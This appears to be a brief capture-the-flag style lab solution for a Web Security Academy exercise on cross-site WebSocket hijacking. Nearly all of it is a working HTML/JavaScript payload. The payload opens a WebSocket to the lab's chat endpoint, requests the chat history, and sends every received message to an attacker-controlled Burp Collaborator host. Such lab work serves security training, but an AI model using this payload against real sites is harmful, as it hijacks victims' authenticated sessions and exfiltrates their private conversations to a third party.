# Lab: Cross-site WebSocket hijacking
We should open a WebSocket and send the incoming messages to our host website - burp collaborator.
The constructed HTML:
```html
<script>
  var ws = new WebSocket('wss://a8jqoxlt56vwc85khm1prw4mzd55tu.web-security-academy.net/chat');
  ws.onopen= function(e) {
  ws.send("READY");
  };
ws.onmessage=function(e) {
var req = new XMLHttpRequest();
req.open('get','https://a8jqoxlt56vwc85khm1prw4mzd55tu.burpcollaborator.net/?sdsd='+e.data,true);
req.send();
};
</script>
```